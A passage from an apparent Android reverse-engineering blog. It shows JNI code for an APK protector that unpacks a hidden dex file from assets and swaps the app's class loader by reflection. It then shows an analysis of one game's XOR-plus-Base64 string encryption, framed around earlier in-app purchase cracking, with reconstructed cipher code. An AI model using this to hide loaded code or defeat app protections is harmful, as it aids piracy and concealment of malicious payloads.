CharTojstring(env,aa);</div><div class="line">	jstring jbb = CharTojstring(env,bb);</div><div class="line">	jobjectArray pareTyple;</div><div class="line">	jobjectArray pareVaules;</div><div class="line">	jobject currentActivityThread = invokeStaticMethodss(env,jaa,jbb,pareTyple,pareVaules );</div><div class="line">	char *cc=&quot;android.app.ActivityThread&quot;, *dd = &quot;mPackages&quot;;</div><div class="line">	jstring jcc= CharTojstring(env,cc);</div><div class="line">	jstring jdd = CharTojstring(env,dd);</div><div class="line">	        jclass class_hashmap=env-&gt;FindClass(&quot;java/util/HashMap&quot;);</div><div class="line">	        jmethodID hashmap_construct_method=env-&gt;GetMethodID(class_hashmap, &quot;&lt;init&gt;&quot;,&quot;()V&quot;);</div><div class="line">	        jobject obj_hashmap =env-&gt;NewObject(class_hashmap, hashmap_construct_method, &quot;&quot;);</div><div class="line">	        obj_hashmap = getFieldOjbect(env,jcc, currentActivityThread,jdd);</div><div class="line">	   // newä¸€ä¸ªWeakReferenceå¯¹è±¡java.lang.ref.WeakReference   get_get_obj ==wr.get();</div><div class="line">	        jclass class_WeakReference=env-&gt;FindClass(&quot;java/lang/ref/WeakReference&quot;);</div><div class="line">	        if(class_WeakReference==NULL)&#123;</div><div class="line">	        	LOGI(&quot;class_WeakReference Not Found &quot;);</div><div class="line"></div><div class="line">	        &#125;</div><div class="line">	        jmethodID WeakReference_get_method=env-&gt;GetMethodID(class_WeakReference, &quot;get&quot;,&quot;()Ljava/lang/Object;&quot;);</div><div class="line">	        if(WeakReference_get_method==NULL)&#123;</div><div class="line">	        	        	LOGI(&quot;WeakReference_get_method Not Found &quot;);</div><div class="line"></div><div class="line">	        	        &#125;</div><div class="line">	        jmethodID get_func = env-&gt;GetMethodID(class_hashmap,&quot;get&quot;,&quot;(Ljava/lang/Object;)Ljava/lang/Object;&quot;);</div><div class="line">	        if(get_func==NULL)&#123;</div><div class="line">	       	        	        	LOGI(&quot;get_func Not Found &quot;);</div><div class="line">	       	&#125;</div><div class="line">	        jobject get_obj =env-&gt;CallObjectMethod(obj_hashmap, get_func,packagename);</div><div class="line">	        if(get_obj==NULL)&#123;</div><div class="line">	        	       	        	        	LOGI(&quot;get_obj Not Found &quot;);</div><div class="line">	        &#125;</div><div class="line">	        jobject get_get_obj = env-&gt;CallObjectMethod(get_obj, WeakReference_get_method);</div><div class="line">	        if(get_get_obj==NULL)&#123;</div><div class="line">	        	        	       	        	        	LOGI(&quot;get_get_obj Not Found &quot;);</div><div class="line">	         &#125;</div><div class="line">	        //Strings prepared</div><div class="line">	        const char *str = env-&gt;GetStringUTFChars(packagename, 0);</div><div class="line">	        char parameter1[128];</div><div class="line">	        char parameter2[128];</div><div class="line">	        char parameter3[128];</div><div class="line">	        const char *qz =&quot;/data/data/&quot;, *hz1 = &quot;/.cache/classdex.jar&quot; ,*hz2 = &quot;/.cache&quot;,*hz3 = &quot;/.cache/&quot;;</div><div class="line">	        strcpy(parameter1, qz);</div><div class="line">	        strcat(parameter1, str);</div><div class="line">	        strcat(parameter1, hz1);</div><div class="line">	        strcpy(parameter2, qz);</div><div class="line">	        strcat(parameter2, str);</div><div class="line">	       	strcat(parameter2, hz2);</div><div class="line">	       	strcpy(parameter3, qz);</div><div class="line">	       	strcat(parameter3, str);</div><div class="line">	       	strcat(parameter3, hz3);</div><div class="line">	       	env-&gt;ReleaseStringUTFChars(packagename, str);</div><div class="line">	       	jstring jparameter1 = CharTojstring(env,parameter1);</div><div class="line">	       	jstring jparameter2 = CharTojstring(env,parameter2);</div><div class="line">	       	jstring jparameter3 = CharTojstring(env,parameter3);</div><div class="line">	       	char *loadapk = &quot;android.app.LoadedApk&quot;,*mClassLoader = &quot;mClassLoader&quot;;</div><div class="line">	       	jstring jloadapk= CharTojstring(env,loadapk);</div><div class="line">	       	jstring jmClassLoader = CharTojstring(env,mClassLoader);</div><div class="line">	        jclass class_DexClassloader=env-&gt;FindClass(&quot;dalvik/system/DexClassLoader&quot;);</div><div class="line">	        if(class_DexClassloader==NULL)&#123;</div><div class="line">	        			LOGI(&quot;class_DexClassloader Not Found &quot;);</div><div class="line">	       	         &#125;</div><div class="line">	        jmethodID DexClassloader_construct_method=env-&gt;GetMethodID(class_DexClassloader, &quot;&lt;init&gt;&quot;,&quot;(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V&quot;);</div><div class="line">	        if(DexClassloader_construct_method==NULL)&#123;</div><div class="line">	       	        	        	       	        	        	LOGI(&quot;DexClassloader_construct_method Not Found &quot;);</div><div class="line">	       	         &#125;</div><div class="line">	        jobject obj_DexClassloader =env-&gt;NewObject(class_DexClassloader, DexClassloader_construct_method,jparameter1,jparameter2,jparameter3,getFieldOjbect(env,jloadapk,get_get_obj,jmClassLoader));</div><div class="line">	        if(obj_DexClassloader==NULL)&#123;</div><div class="line">	       	        	        	       	        	        	LOGI(&quot;obj_DexClassloader Not Found &quot;);</div><div class="line">	       	 &#125;</div><div class="line">	        setFieldOjbect(env,jloadapk,jmClassLoader,get_get_obj, obj_DexClassloader);</div><div class="line"></div><div class="line">	        return get_get_obj;</div><div class="line">&#125;</div><div class="line">JNIEXPORT void JNICALL sub_1111( JNIEnv* env,</div><div class="line">                                                  jobject thiz,jobject context )</div><div class="line">&#123;</div><div class="line">	guard(env,thiz,context );</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Java和JNI函数的绑定表</div><div class="line">static JNINativeMethod method_table[] = &#123;</div><div class="line">	&#123; &quot;ErickyProtect&quot;, &quot;(Landroid/content/Context;)Ljava/lang/Object;&quot;, (void*)sub_2222 &#125;,//绑定Ericky3</div><div class="line">	&#123; &quot;ErickyGuard&quot;, &quot;(Landroid/content/Context;)V&quot;, (void*)sub_1111 &#125;,//Ericky1</div><div class="line">&#125;;</div><div class="line">// 注册native方法到java中</div><div class="line">static int registerNativeMethods(JNIEnv* env, const char* className,</div><div class="line">        JNINativeMethod* gMethods, int numMethods)</div><div class="line">&#123;</div><div class="line">	jclass clazz;</div><div class="line">	clazz = env-&gt;FindClass( className);</div><div class="line">	if (clazz == NULL) &#123;</div><div class="line">		return JNI_FALSE;</div><div class="line">	&#125;</div><div class="line">	if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) &#123;</div><div class="line">		return JNI_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	return JNI_TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int register_ndk_load(JNIEnv *env)</div><div class="line">&#123;</div><div class="line">	// 调用注册方法</div><div class="line">    return registerNativeMethods(env, JNIREG_CLASS,</div><div class="line">            method_table, NELEM(method_table));</div><div class="line">&#125;</div><div class="line"></div><div class="line">JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved)</div><div class="line">&#123;</div><div class="line">    JNIEnv* env = NULL;</div><div class="line">    jint result = -1;</div><div class="line"></div><div class="line">    if (vm-&gt;GetEnv((void**) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123;</div><div class="line">        return result;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    register_ndk_load(env);</div><div class="line"></div><div class="line">	// 返回jni的版本</div><div class="line">    return JNI_VERSION_1_4;</div><div class="line">&#125;</div><div class="line">//Copy fuctions and initial fuctions</div><div class="line">void guard( JNIEnv* env,jobject thiz,jobject context )</div><div class="line">&#123;</div><div class="line">			jclass native_clazz = env-&gt;GetObjectClass(context);</div><div class="line">			jmethodID methodID_func = env-&gt;GetMethodID(native_clazz,&quot;getPackageName&quot;, &quot;()Ljava/lang/String;&quot;);</div><div class="line">			jstring packagename =(jstring)(env-&gt;CallObjectMethod(context, methodID_func));</div><div class="line">				const char *str = env-&gt;GetStringUTFChars(packagename, 0);</div><div class="line">				char destination[128];</div><div class="line">			    const char *blank =&quot;/data/data/&quot;, *c = &quot;/.cache/&quot;;</div><div class="line">				strcpy(destination, blank);</div><div class="line">				strcat(destination, str);</div><div class="line">				strcat(destination, c);</div><div class="line">				LOGI(&quot;stringcccccccccccccccc %s&quot;,destination);//åŽ»å­—ç¬¦ä¸²s%</div><div class="line"></div><div class="line">				env-&gt;ReleaseStringUTFChars(packagename, str);</div><div class="line">				jint a = mkdir(destination,777);</div><div class="line"></div><div class="line">				LOGI(&quot;Created a file in android! %d&quot;,a);//åŽ»å­—ç¬¦ä¸²s%</div><div class="line">				const char *pre = &quot;chmod 755 &quot;;</div><div class="line">				char cmd[128];</div><div class="line">				strcpy(cmd, pre);</div><div class="line">				strcat(cmd, destination);</div><div class="line">				LOGI(&quot;cmd %s&quot;,cmd);//åŽ»å­—ç¬¦ä¸²s%</div><div class="line">				jstring jcmd = CharTojstring(env,cmd);</div><div class="line"></div><div class="line">			//exec</div><div class="line">				jclass Runtime = env-&gt;FindClass(&quot;java/lang/Runtime&quot;);</div><div class="line">				jmethodID Runtime_func = env-&gt;GetStaticMethodID(Runtime,&quot;getRuntime&quot;,&quot;()Ljava/lang/Runtime;&quot;);</div><div class="line">				jobject class_obj =	env-&gt;CallStaticObjectMethod(Runtime, Runtime_func);</div><div class="line">				jclass class_java = env-&gt;GetObjectClass(class_obj);</div><div class="line"></div><div class="line">				jmethodID exec_func = env-&gt;GetMethodID(class_java,&quot;exec&quot;,&quot;(Ljava/lang/String;)Ljava/lang/Process;&quot;);</div><div class="line">				jobject method_obj =env-&gt;CallObjectMethod(class_obj, exec_func,jcmd);</div><div class="line">				jclass class_method_obj= env-&gt;GetObjectClass(method_obj);</div><div class="line"></div><div class="line">				jmethodID waitfor_func = env-&gt;GetMethodID(class_method_obj,&quot;waitFor&quot;,&quot;()I&quot;);</div><div class="line">				jint result = env-&gt;CallIntMethod(method_obj,waitfor_func);</div><div class="line"></div><div class="line">				LOGI(&quot;CallIntMethod %d&quot;,result);//åŽ»å­—ç¬¦ä¸²s%</div><div class="line">	//***************************************************************************************Copy fuctions</div><div class="line">				//************************despath</div><div class="line">					// èŽ·å¾— Context ç±»</div><div class="line">					jclass native_clazz2 = env-&gt;GetObjectClass(context);</div><div class="line">					jmethodID methodID_func2 = env-&gt;GetMethodID(native_clazz2,&quot;getPackageName&quot;, &quot;()Ljava/lang/String;&quot;);</div><div class="line">					jstring packagename2 =(jstring)(env-&gt;CallObjectMethod(context, methodID_func2));</div><div class="line">					const char *str2 = env-&gt;GetStringUTFChars(packagename2, 0);</div><div class="line">					char destination2[128];</div><div class="line">				    const char *blank2 =&quot;/data/data/&quot;, *c2 = &quot;/.cache/classdex.jar&quot;;</div><div class="line">					strcpy(destination2, blank2);</div><div class="line">					strcat(destination2, str2);</div><div class="line">					strcat(destination2, c2);</div><div class="line">					LOGI(&quot;string %s&quot;,destination2);</div><div class="line">					LOGI(&quot;log test ok &quot;);</div><div class="line">					env-&gt;ReleaseStringUTFChars(packagename2, str2);</div><div class="line">					jstring jdestination = CharTojstring(env,destination2);</div><div class="line">					jmethodID methodID_getApplicationInfo = env-&gt;GetMethodID(native_clazz2,&quot;getApplicationInfo&quot;, &quot;()Landroid/content/pm/ApplicationInfo;&quot;);</div><div class="line">					jobject ApplicationInfo =env-&gt;CallObjectMethod(context, methodID_getApplicationInfo);</div><div class="line">					jclass cls_ApplicationInfo=env-&gt;GetObjectClass(ApplicationInfo);</div><div class="line"></div><div class="line">					jfieldID JarFieldId = env-&gt;GetFieldID(cls_ApplicationInfo,&quot;publicSourceDir&quot;, &quot;Ljava/lang/String;&quot;);</div><div class="line"></div><div class="line">					jstring SourceDir =(jstring)(env-&gt;GetObjectField(ApplicationInfo,JarFieldId));</div><div class="line">						const char *strs = env-&gt;GetStringUTFChars(SourceDir, 0);</div><div class="line">						char destinations[128];</div><div class="line">						strcpy(destinations, strs);</div><div class="line">						jbyteArray bytes = env-&gt;NewByteArray(65536);</div><div class="line">						LOGI(&quot;HAHAHAHHAHAHAHA %s&quot;,destinations);//</div><div class="line">						env-&gt;ReleaseStringUTFChars(SourceDir, strs);</div><div class="line">						LOGI(&quot;HAHAHAHHAHAHAHA222222222222222â€œ&quot;);</div><div class="line">						//initial strings</div><div class="line">						char *classdex_jar2=&quot;assets/ErickyProtect.so&quot;;//包里的文件</div><div class="line">						jstring jclassdex_jar = CharTojstring(env,classdex_jar2);</div><div class="line">						////////////new JarFile</div><div class="line">						jclass cls_JarFile = env-&gt;FindClass(&quot;java/util/jar/JarFile&quot;);</div><div class="line">					    jmethodID methodID_JarFile = env-&gt;GetMethodID(cls_JarFile,&quot;&lt;init&gt;&quot;, &quot;(Ljava/lang/String;)V&quot;);</div><div class="line">					jobject localJarFile = env-&gt;NewObject(cls_JarFile, methodID_JarFile,SourceDir);</div><div class="line"></div><div class="line">						//localjarFile getEntry method</div><div class="line">						jmethodID methodID_getentry = env-&gt;GetMethodID(cls_JarFile,&quot;getEntry&quot;, &quot;(Ljava/lang/String;)Ljava/util/zip/ZipEntry;&quot;);</div><div class="line">						jobject LocalZipEntry = env-&gt;CallObjectMethod(localJarFile,methodID_getentry,jclassdex_jar);</div><div class="line">						//localjarFile getInputStream method</div><div class="line">						jmethodID methodID_getInputStream = env-&gt;GetMethodID(cls_JarFile,&quot;getInputStream&quot;, &quot;(Ljava/util/zip/ZipEntry;)Ljava/io/InputStream;&quot;);</div><div class="line">						jobject BufferinputstreamParam = env-&gt;CallObjectMethod(localJarFile,methodID_getInputStream,LocalZipEntry);</div><div class="line"></div><div class="line">						//new a File class</div><div class="line">						jclass cls_File = env-&gt;FindClass(&quot;java/io/File&quot;);</div><div class="line">						jmethodID methodID_File = env-&gt;GetMethodID(cls_File,&quot;&lt;init&gt;&quot;, &quot;(Ljava/lang/String;)V&quot;);</div><div class="line">						jobject localFile = env-&gt;NewObject(cls_File, methodID_File,jdestination);</div><div class="line"></div><div class="line">						//new  BufferedInputStream</div><div class="line">						jclass cls_BufferedInputStream = env-&gt;FindClass(&quot;java/io/BufferedInputStream&quot;);</div><div class="line">						jmethodID methodID_BufferedInputStream = env-&gt;GetMethodID(cls_BufferedInputStream,&quot;&lt;init&gt;&quot;, &quot;(Ljava/io/InputStream;)V&quot;);</div><div class="line">						jobject localBufferedInputStream = env-&gt;NewObject(cls_BufferedInputStream, methodID_BufferedInputStream,BufferinputstreamParam);</div><div class="line">						//new FileoutputStream</div><div class="line"></div><div class="line">						jclass cls_FileOutputStream = env-&gt;FindClass(&quot;java/io/FileOutputStream&quot;);</div><div class="line">						jmethodID methodID_FileOutputStream= env-&gt;GetMethodID(cls_FileOutputStream,&quot;&lt;init&gt;&quot;, &quot;(Ljava/io/File;)V&quot;);</div><div class="line">						jobject BufferoutputstreamParam = env-&gt;NewObject(cls_FileOutputStream, methodID_FileOutputStream,localFile);</div><div class="line"></div><div class="line">						//new BufferedOutputStream</div><div class="line">						jclass cls_BufferedOutputStream = env-&gt;FindClass(&quot;java/io/BufferedOutputStream&quot;);</div><div class="line">						jmethodID methodID_BufferedOutputStream = env-&gt;GetMethodID(cls_BufferedOutputStream,&quot;&lt;init&gt;&quot;, &quot;(Ljava/io/OutputStream;)V&quot;);</div><div class="line">						jobject localBufferedOutputStream = env-&gt;NewObject(cls_BufferedOutputStream, methodID_BufferedOutputStream,BufferoutputstreamParam);</div><div class="line">						//some preparations</div><div class="line">						jmethodID methodID_write = env-&gt;GetMethodID(cls_BufferedOutputStream,&quot;write&quot;, &quot;([BII)V&quot;);</div><div class="line">						jmethodID methodID_read = env-&gt;GetMethodID(cls_BufferedInputStream,&quot;read&quot;, &quot;([B)I&quot;);</div><div class="line">						jmethodID output_flush = env-&gt;GetMethodID(cls_BufferedOutputStream,&quot;flush&quot;, &quot;()V&quot;);</div><div class="line">						jmethodID output_close = env-&gt;GetMethodID(cls_BufferedOutputStream,&quot;close&quot;, &quot;()V&quot;);</div><div class="line">						jmethodID input_close = env-&gt;GetMethodID(cls_BufferedInputStream,&quot;close&quot;, &quot;()V&quot;);</div><div class="line"></div><div class="line">						while(true)&#123;</div><div class="line">							jint i =env-&gt;CallIntMethod(localBufferedInputStream,methodID_read,bytes);</div><div class="line">							LOGI(&quot;IIIIIIIIII %d&quot;,i);</div><div class="line">							if (i &lt;= 0)&#123;</div><div class="line">								env-&gt;CallVoidMethod(localBufferedOutputStream,output_flush);</div><div class="line">								env-&gt;CallVoidMethod(localBufferedOutputStream,output_close);</div><div class="line">								env-&gt;CallVoidMethod(localBufferedInputStream,input_close);</div><div class="line">								return;</div><div class="line">							&#125;</div><div class="line">							env-&gt;CallVoidMethod(localBufferedOutputStream,methodID_write,bytes,0,i);</div><div class="line">							LOGI(&quot;afterwrite %d&quot;,i);</div><div class="line"></div><div class="line">						&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">jstring   CharTojstring(JNIEnv*   env,   char*   str)</div><div class="line">&#123;</div><div class="line">    jsize   len   =   strlen(str);</div><div class="line"></div><div class="line">    jclass   clsstring   =   env-&gt;FindClass(&quot;java/lang/String&quot;);</div><div class="line">    jstring   strencode   =   env-&gt;NewStringUTF(&quot;GB2312&quot;);</div><div class="line"></div><div class="line">    jmethodID   mid   =   env-&gt;GetMethodID(clsstring,   &quot;&lt;init&gt;&quot;,   &quot;([BLjava/lang/String;)V&quot;);</div><div class="line">    jbyteArray   barr   =   env-&gt; NewByteArray(len);</div><div class="line"></div><div class="line">    env-&gt; SetByteArrayRegion(barr,0,len,(jbyte*)str);</div><div class="line">    return (jstring)env-&gt; NewObject(clsstring,mid,barr,strencode);</div><div class="line">&#125;</div><div class="line">jobject   getFieldOjbect(JNIEnv *env,</div><div class="line">		jstring class_name, jobject obj, jstring fieldName)</div><div class="line">&#123;</div><div class="line">			jclass context = env-&gt;FindClass(&quot;java/lang/Class&quot;);</div><div class="line">			jmethodID forName_func = env-&gt;GetStaticMethodID(context,&quot;forName&quot;,&quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;);</div><div class="line">			jobject class_obj =	env-&gt;CallStaticObjectMethod(context, forName_func,class_name);</div><div class="line">			jclass class_java = env-&gt;GetObjectClass(class_obj);</div><div class="line"></div><div class="line">			jmethodID getField_func = env-&gt;GetMethodID(class_java,&quot;getDeclaredField&quot;,&quot;(Ljava/lang/String;)Ljava/lang/reflect/Field;&quot;);</div><div class="line">			jobject method_obj =env-&gt;CallObjectMethod(class_obj, getField_func,fieldName);</div><div class="line">			jclass class_method_obj= env-&gt;GetObjectClass(method_obj);</div><div class="line"></div><div class="line">			jmethodID setaccess_func = env-&gt;GetMethodID(class_method_obj,&quot;setAccessible&quot;,&quot;(Z)V&quot;);</div><div class="line">			env-&gt;CallVoidMethod(method_obj,setaccess_func,true);</div><div class="line"></div><div class="line">			jmethodID get_func = env-&gt;GetMethodID(class_method_obj,&quot;get&quot;,&quot;(Ljava/lang/Object;)Ljava/lang/Object;&quot;);</div><div class="line">			jobject get_obj =env-&gt;CallObjectMethod(method_obj,get_func,obj);</div><div class="line"></div><div class="line">			env-&gt;DeleteLocalRef(class_java);</div><div class="line">			env-&gt;DeleteLocalRef(method_obj);</div><div class="line">			return get_obj;</div><div class="line"></div><div class="line">&#125;</div><div class="line">jobject  invokeStaticMethodss (JNIEnv *env,jstring class_name, jstring method_name, jobjectArray pareTyple, jobjectArray pareVaules)</div><div class="line">&#123;</div><div class="line">		jclass context = env-&gt;FindClass(&quot;java/lang/Class&quot;);</div><div class="line">		jmethodID forName_func = env-&gt;GetStaticMethodID(context,&quot;forName&quot;,&quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;);</div><div class="line">		jobject class_obj =	env-&gt;CallStaticObjectMethod(context, forName_func,class_name);</div><div class="line">		jclass class_java = env-&gt;GetObjectClass(class_obj);</div><div class="line"></div><div class="line">		jmethodID getMethod_func = env-&gt;GetMethodID(class_java,&quot;getMethod&quot;,&quot;(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;&quot;);</div><div class="line">		jobject method_obj =env-&gt;CallObjectMethod(class_obj, getMethod_func,method_name,pareTyple);</div><div class="line">		jclass class_method_obj= env-&gt;GetObjectClass(method_obj);</div><div class="line"></div><div class="line">		jmethodID invoke_func = env-&gt;GetMethodID(class_method_obj,&quot;invoke&quot;,&quot;(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;&quot;);</div><div class="line">		jobject invoke_obj =env-&gt;CallObjectMethod(method_obj,invoke_func,NULL,pareVaules);</div><div class="line">		env-&gt;DeleteLocalRef(class_java);</div><div class="line">		env-&gt;DeleteLocalRef(method_obj);</div><div class="line">		return invoke_obj;</div><div class="line">&#125;</div><div class="line">void     setFieldOjbect(JNIEnv *env, jstring class_name, jstring fieldName, jobject obj, jobject filedVaule)</div><div class="line"></div><div class="line">&#123;</div><div class="line">				jclass context = env-&gt;FindClass(&quot;java/lang/Class&quot;);</div><div class="line">				jmethodID forName_func = env-&gt;GetStaticMethodID(context,&quot;forName&quot;,&quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;);</div><div class="line">				jobject class_obj =	env-&gt;CallStaticObjectMethod(context, forName_func,class_name);</div><div class="line">				jclass class_java = env-&gt;GetObjectClass(class_obj);</div><div class="line"></div><div class="line">				jmethodID getField_func = env-&gt;GetMethodID(class_java,&quot;getDeclaredField&quot;,&quot;(Ljava/lang/String;)Ljava/lang/reflect/Field;&quot;);</div><div class="line">				jobject method_obj =env-&gt;CallObjectMethod(class_obj, getField_func,fieldName);</div><div class="line">				jclass class_method_obj= env-&gt;GetObjectClass(method_obj);</div><div class="line"></div><div class="line">				jmethodID setaccess_func = env-&gt;GetMethodID(class_method_obj,&quot;setAccessible&quot;,&quot;(Z)V&quot;);</div><div class="line">				env-&gt;CallVoidMethod(method_obj,setaccess_func,true);</div><div class="line"></div><div class="line">				jmethodID set_func = env-&gt;GetMethodID(class_method_obj,&quot;set&quot;,&quot;(Ljava/lang/Object;Ljava/lang/Object;)V&quot;);</div><div class="line">				env-&gt;CallVoidMethod(method_obj,set_func,obj,filedVaule);</div><div class="line"></div><div class="line">				env-&gt;DeleteLocalRef(class_java);</div><div class="line">				env-&gt;DeleteLocalRef(method_obj);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2015/07/27/三国kill字符串加密算法分析/">
  <time datetime="2015-07-26T16:06:00.000Z">
    2015-07-27
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2015/07/27/三国kill字符串加密算法分析/">三国kill字符串加密算法分析</a></h1>
  

  </header>
  
  <div class="entry">
    
      <p>三国kill字符串加密算法分析<br>【文章标题】:三国kill字符串加密算法<br>【文章作者】: Ericky<br>【作者博客】: <a href="http://blog.csdn.net/hk9259" target="_blank" rel="external">http://blog.csdn.net/hk9259</a><br>【下载地址】: 百度下载<br>【保护方式】: 字符串加密<br>【作者声明】: 本人水平有限，若有不足错误之处请各位大侠指正</p>
<h1 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h1><p>据说这款游戏的老版本是可以直接修改其中相应的字符串来进行狸猫换太子，从而绕过检验并且达到内购破解的效果，如今时隔一年，该游戏为了防止被篡改或者其他，加强了对自身的加密，尤其把一些关键字符串所保护，强度是否值得起时间的考验，我们来一探究竟。</p>
<h1 id="0x2-定位"><a href="#0x2-定位" class="headerlink" title="0x2 定位"></a>0x2 定位</h1><p>打开libgame.so，按照以前的思路，在浩瀚的字符串中找到加密的字符串如下：<br><img src="http://img.blog.csdn.net/20150727000248485" alt="这里写图片描述"><br>定位到红色框框中的类如下：<br><img src="http://img.blog.csdn.net/20150727000422666" alt="这里写图片描述"></p>
<h1 id="0x3-分析"><a href="#0x3-分析" class="headerlink" title="0x3 分析"></a>0x3 分析</h1><p>分析如图：<br><img src="http://img.blog.csdn.net/20150727000441589" alt="这里写图片描述"><br>继续向下分析：<br><img src="http://img.blog.csdn.net/20150727000350510" alt="这里写图片描述"><br>跟进后如下：<br><img src="http://img.blog.csdn.net/20150727000523647" alt="这里写图片描述"><br>Base64为标准的解密方式。<br>而下面的函数为Xor编码函数，不用管我们继续往下跟进：<br><img src="http://img.blog.csdn.net/20150727000429120" alt="这里写图片描述"><br>这里是一个循环解密，关键函数为70004C。<br>跟进去再继续跟来到SUB_7BE950这个函数：<br><img src="http://img.blog.csdn.net/20150727000603255" alt="这里写图片描述"><br>然后进行解密，解密出来的字符串用于so里面的调用。</p>
<h1 id="0x4-写解密加密程序"><a href="#0x4-写解密加密程序" class="headerlink" title="0x4 写解密加密程序"></a>0x4 写解密加密程序</h1><p>还原加密代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">//加密字符串 </div><div class="line">BYTE arry[] = &quot;classes.dea&quot;;</div><div class="line">//加密KEY</div><div class="line">const  uint32_t  Key  =  0x9f;</div><div class="line">//初始化</div><div class="line">unsigned char XorOut[100] =&quot;&quot;; </div><div class="line">char Base64Out[100]=&quot;&quot;;</div><div class="line">const  size_t  lens  =  sizeof(arry); </div><div class="line">for  (size_t  i  = 0  ;  i  &lt;  lens - 1;  i++)  &#123; </div><div class="line"></div><div class="line">	XorOut[i] = arry[i]  ^  (Key+i);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">base64_encode( XorOut, Base64Out, lens-1 );</div><div class="line"></div><div class="line">printf(&quot;%s\n&quot;,  Base64Out); </div><div class="line"></div><div class="line">char * base64_encode( const unsigned char * bindata, char * base64, int binlength )</div><div class="line">&#123;</div><div class="line">    int i, j;</div><div class="line">    unsigned char current;</div><div class="line"></div><div class="line">    for ( i = 0, j = 0 ; i &lt; binlength ; i += 3 )</div><div class="line">    &#123;</div><div class="line">        current = (bindata[i] &gt;&gt; 2) ;</div><div class="line">        current &amp;= (unsigned char)0x3F;</div><div class="line">        base64[j++] = base64char[(int)current];</div><div class="line"></div><div class="line">        current = ( (unsigned char)(bindata[i] &lt;&lt; 4 ) ) &amp; ( (unsigned char)0x30 ) ;</div><div class="line">        if ( i + 1 &gt;= binlength )</div><div class="line">        &#123;</div><div class="line">            base64[j++] = base64char[(int)current];</div><div class="line">            base64[j++] = &apos;=&apos;;</div><div class="line">            base64[j++] = &apos;=&apos;;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">        current |= ( (unsigned char)(bindata[i+1] &gt;&gt; 4) ) &amp; ( (unsigned char) 0x0F );</div><div class="line">        base64[j++] = base64char[(int)current];</div><div class="line"></div><div class="line">        current = ( (unsigned char)(bindata[i+1] &lt;&lt; 2) ) &amp; ( (unsigned char)0x3C ) ;</div><div class="line">        if ( i + 2 &gt;= binlength )</div><div class="line">        &#123;</div><div class="line">            base64[j++] = base64char[(int)current];</div><div class="line">            base64[j++] = &apos;=&apos;;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">        current |= ( (unsigned char)(bindata[i+2] &gt;&gt; 6) ) &amp; ( (unsigned char) 0x03 );</div><div class="line">        base64[j++] = base64char[(int)current];</div><div class="line"></div><div class="line">        current = ( (unsigned char)bindata[i+2] ) &amp; ( (unsigned char)0x3F ) ;</div><div class="line">        base64[j++] = base64char[(int)current];</div><div class="line">    &#125;</div><div class="line">    base64[j] = &apos;\0&apos;;</div><div class="line">    return base64;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>还原解密代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line">//*******************解密</div><div class="line">//KEY</div><div class="line">const  uint32_t Key2 = 0X9f;</div><div 